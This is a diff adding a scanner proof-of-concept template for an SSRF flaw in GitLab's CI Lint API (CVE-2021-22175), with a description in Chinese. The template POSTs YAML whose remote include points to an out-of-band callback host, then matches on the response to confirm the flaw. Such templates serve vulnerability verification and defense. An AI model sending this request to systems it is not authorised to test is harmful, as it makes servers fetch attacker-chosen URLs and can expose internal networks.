@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "通过向 GitLab CI Lint API 发送包含恶意远程 include 配置的 YAML 请求，验证 SSRF 漏洞是否存在。目标 GitLab 实例需开启 webhook 内部网络请求功能，攻击者无需认证即可构造请求触发服务端向任意 URL 发起请求。"
+id = "POC-AVE-2021-0600"
+name = "GitLab CI Lint API SSRF PoC"
+severity = "critical"
+tags = ["ave-2021-0600"]
+vuln_id = [
+    "CVE-2021-22175",
+    "AVE-2021-0600",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v4/ci/lint"
+protocol = "http"
+
+[poc.requests.body]
+content = '''{"include_merged_yaml":true,"content":"include:\n  remote: 'http://{{interactsh-url}}/gitlab.yml'"}'''
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Included file",
+    '"errors"',
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
